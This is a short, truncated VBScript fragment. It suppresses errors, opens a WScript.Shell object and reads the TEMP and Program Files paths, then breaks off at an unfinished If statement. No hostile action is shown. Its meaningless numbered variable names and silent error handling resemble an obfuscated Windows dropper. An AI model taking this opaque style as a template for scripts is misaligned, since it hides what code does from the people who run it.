Function ParseProfileBlock11()
On Error Resume Next
  Dim strBackup7,strConfigData23,strValue97
  Set strBackup7=CreateObject("WScript.Shell")
  strConfigData23=strBackup7.ExpandEnvironmentStrings("%TEMP%")
  strValue97=strBackup7.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strConfigData23)>0 And Len(strValue97)>0 Then
